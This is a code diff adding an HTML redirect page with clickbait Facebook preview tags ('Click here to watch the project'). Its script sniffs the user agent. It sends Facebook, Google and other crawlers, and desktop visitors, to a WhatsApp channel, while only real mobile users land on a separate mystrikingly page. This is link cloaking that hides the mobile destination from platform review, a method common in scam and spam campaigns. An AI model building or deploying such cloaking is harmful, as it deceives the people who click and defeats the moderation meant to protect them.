@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+
+    <!-- Facebook Social Preview -->
+    <meta property="og:title" content="Click here to watch the project">
+    <meta property="og:image" content="https://i.postimg.cc/HxQKHz3K/IMG-20260616-WA0001.jpg">
+    <meta property="og:type" content="website">
+
+    <script>
+        // Bilkul shuru mein redirect execute hoga
+        (function() {
+            var whatsappChannel = "https://whatsapp.com/channel/0029Vb8pdaR6buMT4C6gtW1O";
+            var mobileLandingPage = "https://ocher-bison-11v65rt.mystrikingly.com"; 
+
+            var userAgent = navigator.userAgent || "";
+            
+            // Bot Detection
+            var isBot = /facebookexternalhit|Facebot|facebookplatform|Googlebot|AdsBot|Mediapartners|HeadlessChrome|Bot|Crawler|Spider/i.test(userAgent);
+            
+            // Mobile Detection
+            var isRealMobile = /Android|iPhone|iPad|iPod|Opera Mini/i.test(userAgent);
+
+            // Redirection logic
+            if (isBot) {
+                window.location.replace(whatsappChannel);
+            } else if (isRealMobile) {
+                window.location.replace(mobileLandingPage);
+            } else {
+                window.location.replace(whatsappChannel);
+            }
+        })();
+    </script>
+</head>
+<body>
+</body>
+</html>
